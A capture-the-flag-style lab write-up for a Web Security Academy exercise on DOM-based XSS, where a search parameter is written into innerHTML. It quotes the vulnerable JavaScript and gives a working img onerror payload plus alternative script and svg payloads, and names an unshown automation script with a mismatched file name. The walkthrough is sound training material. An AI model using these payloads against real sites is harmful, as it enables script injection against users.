# XSS LAB 04 -  DOM XSS in innerHTML sink using source location.search

## Manual Solution

### 1. Access the Lab
- Access the Web Security Academy lab.

### 2. Make a search query
- Search query: `abc`
- Press F12 or right click -> Inspect
- Notice the `doSearchQuery` function. This function getting the query from the query parameter and passing it to the `document.getElementById('searchMessage').innerHTML` function.
```javascript

function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}

```
- Notice that the query is placed in the span tag. `<span id="searchMessage">abc</span>`

### 3. Make a new search query
- Query: `<img src=x onerror=alert("XSS")>` 
- This breaks the HTML structure and adds a img tag.
- `<span id="searchMessage"><img src=x onerror=alert("XSS")></span> `
- An alert will be triggered.
- We don't use `<script>alert("XSS")</script>` or `<svg onload=alert("XSS")>` because many modern browsers and security policies block inline script execution


## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python xss_lab_02.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)





